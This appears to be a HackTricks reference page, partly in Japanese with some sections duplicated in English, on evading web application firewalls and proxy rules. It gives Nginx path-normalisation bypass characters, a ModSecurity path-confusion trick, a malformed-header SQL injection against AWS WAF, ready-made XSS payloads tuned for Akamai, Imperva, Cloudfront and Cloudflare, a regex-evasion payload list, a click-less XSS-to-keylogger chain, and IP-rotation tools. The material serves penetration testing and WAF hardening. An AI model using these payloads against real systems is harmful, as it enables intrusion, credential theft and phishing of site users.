# Proxy / WAF Protections Bypass

{{#include ../banners/hacktricks-training.md}}


## Bypass Nginx ACL Rules with Pathname Manipulation <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

手法 [from this research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Nginx ルールの例:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
In order to prevent bypasses Nginx performs path normalization before checking it. However, if the backend server performs a different normalization (removing characters that nginx doesn't remove) it might be possible to bypass this defense.

### **NodeJS - Express**

| Nginx バージョン | **Node.js バイパス文字** |
| ------------- | ----------------------------- |
| 1.22.0        | `\xA0`                        |
| 1.21.6        | `\xA0`                        |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`        |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`        |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`        |

### **Flask**

| Nginx バージョン | **Flask バイパス文字**                                    |
| ------------- | -------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx バージョン | **Spring Boot バイパス文字** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

Nginx FPM 設定:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx は `/admin.php` へのアクセスをブロックするように設定されていますが、`/admin.php/index.php` にアクセスすることでこれを回避できる場合があります。

### 防止方法
```plaintext
location ~* ^/admin {
deny all;
}
```
## Mod Security ルールのバイパス <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### パスの混同

[**In this post**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) では、ModSecurity v3 (3.0.12 まで) が、アクセスされたパス（パラメータ開始まで）を含むはずの `REQUEST_FILENAME` 変数を**不適切に実装していた**ことが説明されています。これはパスを取得するために URL デコードを行っていたためです。\
したがって、`http://example.com/foo%3f';alert(1);foo=` のようなリクエストは、mod security では `%3f` が `?` に変換され URL パスが終端すると見なされるため、パスが単に `/foo` であると想定されますが、実際にサーバーが受け取るパスは `/foo%3f';alert(1);foo=` になります。

`REQUEST_BASENAME` と `PATH_INFO` の変数もこのバグの影響を受けていました。

同様の事象は Mod Security のバージョン2でも発生し、バックアップファイルに関連する特定の拡張子（`.bak` など）へのアクセスを防ぐ保護を、ドットを URL エンコードした `%2e` を送るだけで回避できました。例えば: `https://example.com/backup%2ebak`

## AWS WAF ACL のバイパス <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### 不正なヘッダー

[This research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) では、HTTP ヘッダーに適用された AWS WAF ルールを、AWS 側では正しくパースされないがバックエンドサーバーではパースされる「不正な」ヘッダーを送信することでバイパスできたと述べられています。

例えば、ヘッダー X-Query に SQL injection を含む次のリクエストを送信する場合:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
It was possible to bypass AWS WAF because it wouldn't understand that the next line is part of the value of the header while the NODEJS server did (this was fixed).

## Generic WAF bypasses

### Request Size Limits

Commonly WAFs have a certain length limit of requests to check and if a POST/PUT/PATCH request is over it, the WAF won't check the request.

- For AWS WAF, you can [**check the documentation**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Application Load Balancer と AWS AppSync の保護で検査可能なウェブリクエストボディの最大サイズ</td><td>8 KB</td></tr><tr><td>CloudFront、API Gateway、Amazon Cognito、App Runner、および Verified Access の保護で検査可能なウェブリクエストボディの最大サイズ**</td><td>64 KB</td></tr></tbody></table>

- From [**Azure docs**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

Older Web Application Firewalls with Core Rule Set 3.1 (or lower) allow messages larger than **128 KB** by turning off request body inspection, but these messages won't be checked for vulnerabilities. For newer versions (Core Rule Set 3.2 or newer), the same can be done by disabling the maximum request body limit. When a request exceeds the size limit:

もし p**revention mode** の場合: リクエストをログに記録してブロックする。\
もし **detection mode** の場合: 制限まで検査し、それ以降は無視し、`Content-Length` が制限を超えた場合はログを残す。

- From [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

By default, the WAF inspects only the first 8KB of a request. It can increase the limit up to 128KB by adding Advanced Metadata.

- From [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

Up to 128KB.

### Static assets inspection gaps (.js GETs)

Some CDN/WAF stacks apply weak or no content inspection to GET requests for static assets (for example paths ending with `.js`), while still applying global rules like rate limiting and IP reputation. Combined with auto-caching of static extensions, this can be abused to deliver or seed malicious variants that affect subsequent HTML responses.

Practical use cases:

- Send payloads in untrusted headers (e.g., `User-Agent`) on a GET to a `.js` path to avoid content inspection, then immediately request the main HTML to influence the cached variant.
- Use a fresh/clean IP; once an IP is flagged, routing changes can make the technique unreliable.
- In Burp Repeater, use "Send group in parallel" (single-packet style) to race the two requests (`.js` then HTML) through the same front-end path.

This pairs well with header-reflection cache poisoning. See:

{{#ref}}
cache-deception/README.md
{{#endref}}

- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)

### Obfuscation <a href="#ip-rotation" id="ip-rotation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Unicode 互換性 <a href="#unicode-compatability" id="unicode-compatability"></a>

Unicode 正規化の実装によっては（詳細は [here](https://jlajara.gitlab.io/Bypass_WAF_Unicode)）、Unicode 互換文字が WAF をバイパスして意図した payload として実行される場合があります。互換文字は [here](https://www.compart.com/en/unicode) で確認できます。

#### 例 <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```
### Bypass Contextual WAFs with encodings <a href="#ip-rotation" id="ip-rotation"></a>

As mentioned in [**this blog post**](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization), In order to bypass WAFs able to maintain a context of the user input we could abuse the WAF techniques to actually normalize the users input.

例えば、[**this blog post**](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization) では **Akamai がユーザー入力を10回 URL デコードした** と述べられています。したがって、`<input/%2525252525252525253e/onfocus` のようなものは Akamai には `<input/>/onfocus` と見え、タグが閉じられていると判断して問題ないと見なされる可能性があります。しかし、アプリケーションが入力を10回 URL デコードしない限り、被害者側には `<input/%25252525252525253e/onfocus` のように表示され、これは **still valid for a XSS attack** です。

したがって、WAF はデコードして解釈するが被害者は解釈しないような、エンコードされたコンポーネントに **hide payloads in encoded components** することが可能になります。

さらに、これは URL encoded payloads に限らず、unicode、hex、octal のような他のエンコーディングでも実行できます。

In the post the following final bypasses are suggested:

- Akamai:`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva:`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront:`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare:`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

また、一部の WAF がユーザー入力のコンテキストをどのように理解するかによっては、それを悪用できる場合があるとも述べられています。ブログでの例としては、Akamai が `/*` と `*/` の間に何でも置ける（おそらくコメントとして一般的に使われるため）という挙動がありました。したがって、`/*'or sleep(5)-- -*/` のような SQLinjection は検出されず、`/*` がインジェクションの開始文字列で `*/` がコメントになるため有効となります。

この種のコンテキストの問題は、WAF が想定している脆弱性とは別の脆弱性を悪用するためにも利用できます（例：XSS を悪用する、など）。

### Inline JavaScript first-statement inspection gaps

Some inline-inspection rulesets only parse the first JavaScript statement present inside an event handler. By prefixing a harmless-looking expression in parentheses followed by a semicolon (for example `onfocus="(history.length);payload"`), the malicious code placed after the semicolon bypasses inspection while the browser still executes it. Combining this with fragment-induced focus (e.g., appending `#forgot_btn` so the targeted element is focused on load) allows click-less XSS that can immediately call `$.getScript` and bootstrap phishing tooling such as keyloggers. See the [attribute-only login XSS case study](xss-cross-site-scripting/README.md#attribute-only-login-xss-behind-wafs) derived from [this research](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/).

一部の inline-inspection ルールセットは、イベントハンドラ内にある最初の JavaScript ステートメントだけをパースします。無害に見える括弧付きの式にセミコロンを続けて前置する（例: `onfocus="(history.length);payload"`）と、セミコロン以降に置かれた悪意のあるコードは検査を回避しつつブラウザ上で実行されます。これをフラグメントによるフォーカス誘導（例: 対象要素がロード時にフォーカスされるよう `#forgot_btn` を付加）と組み合わせると、クリック不要の XSS を実現でき、即座に `$.getScript` を呼び出して keyloggers のような phishing ツールをブートストラップできます。詳細は [attribute-only login XSS case study](xss-cross-site-scripting/README.md#attribute-only-login-xss-behind-wafs)（これは [this research](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/) に由来）を参照してください。

### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>


{{#ref}}
h2c-smuggling.md
{{#endref}}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

- [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): Generate an API gateway URL to by used with ffuf
- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): Similar to fireprox
- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Burp Suite plugin that uses API gateway IPs
- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): A dynamically determined number of container instances are activated based on the input file size and split factor, with the input split into chunks for parallel execution, such as 100 instances processing 100 chunks from a 10,000-line input file with a split factor of 100 lines.
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

- [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): ffuf で使用するための API gateway URL を生成します
- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): fireprox と類似しています
- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): API gateway の IP を利用する Burp Suite プラグインです
- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): 入力ファイルサイズと split factor に基づいて動的に決定された数のコンテナインスタンスが起動され、入力は並列実行のためにチャンクに分割されます。例えば、10,000 行の入力ファイルを split factor を 100 行にして分割すると、100 インスタンスが 100 チャンクを並列処理します。
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

### Regex Bypasses

Different techniques can be used to bypass the regex filters on the firewalls. Examples include alternating case, adding line breaks, and encoding payloads. Resources for the various bypasses can be found at [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) and [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html). The examples below were pulled from [this article](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).

ファイアウォールの正規表現フィルタを回避するためには、さまざまなテクニックが使えます。例としては、大文字小文字を交互にする、改行を挿入する、ペイロードをエンコードする、などがあります。各種バイパス手法のリソースは [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) や [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) にあります。以下の例は [this article](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2) から引用しました。
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## ツール

- [**nowafpls**](https://github.com/assetnote/nowafpls): リクエストにジャンクデータを追加して長さで WAFs をバイパスする Burp plugin

## 参考資料

- [https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [https://www.youtube.com/watch?v=0OMmWtU2Y_g](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)


{{#include ../banners/hacktricks-training.md}}
